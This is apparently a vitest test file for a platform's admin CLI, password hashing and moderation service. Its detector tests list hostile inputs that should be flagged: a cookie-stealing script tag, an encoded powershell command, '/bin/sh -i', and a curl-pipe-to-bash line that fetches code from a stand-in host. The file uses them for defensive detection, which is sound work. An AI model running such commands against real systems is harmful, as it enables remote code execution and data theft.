import { describe, it } from 'vitest';
import assert from 'node:assert';
import crypto from 'node:crypto';
import { hashArgon2id, verifyArgon2id } from '../../server/v2/utils/crypto.js';
import { V2_COMMAND_REGISTRY } from '../../cli/v2/registry.js';
import { stateManager } from '../../cli/v2/state/stateManager.js';
import { parseCommandLine, requireArg, requireIntArg } from '../../cli/v2/parser.js';
import { HANDLERS } from '../../cli/v2/handlers/index.js';
import { VelumV2Shell } from '../../cli/v2/shell.js';
import { isProtectedUser, isProtectedLounge, guardProtectedUser, guardProtectedLounge } from '../../cli/v2/protection.js';
import { printTable } from '../../cli/v2/table.js';

describe('CLI V2 Modular & Security Verifications', () => {
  it('authenticates valid credentials strictly via verifyArgon2id', async () => {
    const salt = crypto.randomBytes(16).toString('hex');
    const password = 'CorrectHorseBatteryStaple99!';
    const passwordHash = await hashArgon2id(password, Buffer.from(salt, 'hex'));

    const isValid = await verifyArgon2id(password, salt, passwordHash);
    assert.strictEqual(isValid, true);

    const isWrongPassword = await verifyArgon2id('WrongPassword123!', salt, passwordHash);
    assert.strictEqual(isWrongPassword, false);
  });

  it('rejects plaintext password attempts against stored hashes', async () => {
    const salt = crypto.randomBytes(16).toString('hex');
    const password = 'TargetPasswordSecure123';
    const passwordHash = await hashArgon2id(password, Buffer.from(salt, 'hex'));

    const emptySaltMatch = await verifyArgon2id(password, '', passwordHash);
    assert.strictEqual(emptySaltMatch, false);
  });

  it('does not expose pg or redis subcommands in /db command registry', () => {
    const dbCommands = V2_COMMAND_REGISTRY['/db'];
    assert.ok(dbCommands);
    assert.strictEqual(dbCommands['pg'], undefined);
    assert.strictEqual(dbCommands['redis'], undefined);

    assert.ok(dbCommands['integrity']);
    assert.ok(dbCommands['orphans']);
    assert.ok(dbCommands['clean']);
    assert.ok(dbCommands['vacuum']);
    assert.ok(dbCommands['backup']);
    assert.ok(dbCommands['restore']);
  });

  it('validates CLI argument constraints correctly', () => {
    assert.strictEqual(requireArg(['alice'], 0, 'usage', { type: 'username' }), 'alice');
    assert.strictEqual(requireArg(['al'], 0, 'usage', { type: 'username' }), null);
    assert.strictEqual(requireIntArg(['123'], 0, 'usage'), 123);
    assert.strictEqual(requireIntArg(['abc'], 0, 'usage'), null);
  });

  it('persists and enforces CLI state configuration flags', async () => {
    const origTx = stateManager.getTxFeePercent();
    const origTax = stateManager.getTaxPercent();
    const origEscrow = stateManager.getEscrowFeePercent();

    try {
      await stateManager.setTxFeePercent('3.5');
      assert.strictEqual(stateManager.getTxFeePercent(), '3.5');

      await stateManager.setTaxPercent('1.25');
      assert.strictEqual(stateManager.getTaxPercent(), '1.25');

      await stateManager.setEscrowFeePercent('2.0');
      assert.strictEqual(stateManager.getEscrowFeePercent(), '2.0');

      await stateManager.addMuted('bad_actor_99');
      assert.strictEqual(stateManager.isMuted('bad_actor_99'), true);
      await stateManager.removeMuted('bad_actor_99');
      assert.strictEqual(stateManager.isMuted('bad_actor_99'), false);

      await stateManager.addJailed('troll_user_42');
      assert.strictEqual(stateManager.isJailed('troll_user_42'), true);
      await stateManager.removeJailed('troll_user_42');
      assert.strictEqual(stateManager.isJailed('troll_user_42'), false);
    } finally {
      await stateManager.setTxFeePercent(origTx);
      await stateManager.setTaxPercent(origTax);
      await stateManager.setEscrowFeePercent(origEscrow);
    }

    await stateManager.addFrozenWallet('wallet_9999');
    assert.strictEqual(stateManager.isWalletFrozen('wallet_9999'), true);
    await stateManager.removeFrozenWallet('wallet_9999');
    assert.strictEqual(stateManager.isWalletFrozen('wallet_9999'), false);
  });

  it('parses command line tokens and flags correctly', () => {
    const cmd = parseCommandLine('wire user1 user2 50.00 --reason "Payment for services" -f');
    assert.ok(cmd);
    assert.strictEqual(cmd.verb, 'wire');
    assert.deepStrictEqual(cmd.args, ['user1', 'user2', '50.00']);
    assert.strictEqual(cmd.flags['reason'], 'Payment for services');
    assert.strictEqual(cmd.flags['f'], true);
  });

  it('registers all 13 modular namespace handlers', () => {
    const expectedNamespaces = [
      '/users', '/sanctions', '/tickets', '/db', '/market',
      '/escrow', '/devops', '/sys', '/bank', '/cards',
      '/audits', '/fraud', '/lounges'
    ];

    for (const ns of expectedNamespaces) {
      assert.ok(HANDLERS[ns], `Handler for ${ns} should be registered`);
      assert.ok(V2_COMMAND_REGISTRY[ns], `Registry for ${ns} should exist`);
    }

    assert.strictEqual(V2_COMMAND_REGISTRY['/users']['deactivate'], undefined);
    assert.strictEqual(V2_COMMAND_REGISTRY['/users']['cancel'], undefined);
    assert.ok(V2_COMMAND_REGISTRY['/users']['restore']);
    assert.ok(V2_COMMAND_REGISTRY['/users']['purge']);

    assert.ok(V2_COMMAND_REGISTRY['/sanctions']['history']);
    assert.ok(V2_COMMAND_REGISTRY['/sanctions']['flags']);
    assert.ok(V2_COMMAND_REGISTRY['/sanctions']['blacklist']);
    assert.ok(V2_COMMAND_REGISTRY['/sanctions']['whitelist']);
    assert.strictEqual(V2_COMMAND_REGISTRY['/sanctions']['ban'], undefined);
    assert.strictEqual(V2_COMMAND_REGISTRY['/sanctions']['mute'], undefined);
    assert.strictEqual(V2_COMMAND_REGISTRY['/sanctions']['jail'], undefined);
  });

  it('instantiates the modular shell orchestrator', () => {
    const shell = new VelumV2Shell();
    assert.strictEqual(shell.getCurrentPath(), '/');
    const [completions] = shell.getCompletions('cd ');
    assert.ok(completions.includes('/users'));
    assert.ok(completions.includes('/bank'));
  });

  it('enforces system service account protection firewall (IDs 1, 2, 999)', () => {
    assert.strictEqual(isProtectedUser(1), true);
    assert.strictEqual(isProtectedUser(2), true);
    assert.strictEqual(isProtectedUser(999), true);
    assert.strictEqual(isProtectedUser('midnight'), true);
    assert.strictEqual(isProtectedUser('lexie'), true);
    assert.strictEqual(isProtectedUser('velum'), true);
    assert.strictEqual(isProtectedUser('system_bot'), true);

    assert.strictEqual(isProtectedUser(42), false);
    assert.strictEqual(isProtectedUser('regular_user'), false);

    assert.strictEqual(guardProtectedUser(1, 'delete'), false);
    assert.strictEqual(guardProtectedUser(2, 'demote'), false);
    assert.strictEqual(guardProtectedUser(999, 'ban'), false);
    assert.strictEqual(guardProtectedUser(55, 'ban'), true);
  });

  it('enforces official Velum lounge protection firewall (IDs 1-11)', () => {
    for (let id = 1; id <= 11; id++) {
      assert.strictEqual(isProtectedLounge(id), true);
      assert.strictEqual(guardProtectedLounge(id, 'delete'), false);
    }
    assert.strictEqual(isProtectedLounge('velum_lounge'), true);
    assert.strictEqual(isProtectedLounge('velum_general'), true);
    assert.strictEqual(isProtectedLounge('velum_executives'), true);

    assert.strictEqual(isProtectedLounge(99), false);
    assert.strictEqual(isProtectedLounge('random_user_lounge'), false);
    assert.strictEqual(guardProtectedLounge(99, 'delete'), true);
  });

  it('detects commerce fraud phrases with word boundaries', async () => {
    const { moderationService } = await import('../../server/v2/services/moderationService.js');
    assert.strictEqual(moderationService.detectCommerceFraudSignal('Attempting chargeback fraud on escrow'), 'chargeback');
    assert.strictEqual(moderationService.detectCommerceFraudSignal('Installing keylogger on target'), 'keylogger');
    assert.strictEqual(moderationService.detectCommerceFraudSignal('Normal friendly message here'), null);
    assert.strictEqual(moderationService.detectCommerceFraudSignal('battery drain tip for phones'), null);
    assert.strictEqual(moderationService.detectCommerceFraudSignal('Check this phishing link'), null);
    assert.ok(moderationService.detectCommerceFraudSignal('selling phishing kit today'));
  });

  it('detects platform-harm payloads without generic JS false positives', async () => {
    const { moderationService } = await import('../../server/v2/services/moderationService.js');
    assert.ok(moderationService.detectPlatformHarm('<script>document.cookie</script>'));
    assert.ok(moderationService.detectPlatformHarm('powershell.exe -enc dGVzdA=='));
    assert.ok(moderationService.detectPlatformHarm('/bin/sh -i'));
    assert.ok(moderationService.detectPlatformHarm('curl https://evil.test/x.sh | bash'));
    assert.strictEqual(moderationService.detectPlatformHarm('const x = eval("1+1");'), null);
    assert.strictEqual(moderationService.detectPlatformHarm('Standard safe listing title and description'), null);
    assert.strictEqual(moderationService.detectPlatformHarm('exploit guide discussion'), null);
  });

  it('legacy aliases still resolve to the new scanners', async () => {
    const { moderationService } = await import('../../server/v2/services/moderationService.js');
    assert.ok(moderationService.detectMaliciousPayload('<script>x</script>'));
    assert.strictEqual(moderationService.detectZeroToleranceViolation('chargeback scam'), 'chargeback');
  });

  it('reserves disposable test user IDs in the 9000–9999 band', async () => {
    const {
      isTestUserId,
      isForbiddenPublicUserId,
      TEST_USER_ID_MIN,
      TEST_USER_ID_MAX,
      MAX_PUBLIC_USER_ID,
    } = await import('../../server/v2/constants/systemIds.js');
    assert.strictEqual(isTestUserId(9000), true);
    assert.strictEqual(isTestUserId(9999), true);
    assert.strictEqual(isTestUserId(1005), false);
    assert.strictEqual(isForbiddenPublicUserId(9000), true);
    assert.strictEqual(isForbiddenPublicUserId(MAX_PUBLIC_USER_ID), false);
    assert.strictEqual(TEST_USER_ID_MIN, 9000);
    assert.strictEqual(TEST_USER_ID_MAX, 9999);
  });

  it('generates clean bot message templates without ASCII border noise', async () => {
    const { BotTemplates } = await import('../../server/v2/services/botTemplates.js');
    const msg1 = BotTemplates.strike1Warning({ username: 'testuser', reason: 'Spamming channels', strikeNumber: 1 });
    assert.ok(msg1.includes('Strike 1'));
    assert.ok(!msg1.includes('###'));
    assert.ok(!msg1.includes('━━━━'));

    const msg2 = BotTemplates.instantZeroToleranceBlacklist('testuser', 'FRAUD', 'Chargeback fraud detected');
    assert.ok(msg2.includes('Banned'));
    assert.ok(!msg2.includes('###'));
    assert.ok(!msg2.includes('━━━━'));

    const held = BotTemplates.marketplaceListingHeldForReview('seller', 'Item', 'commerce', 'match');
    assert.ok(held.startsWith('Listing held'));
    assert.ok(!held.includes('###'));
  });
});
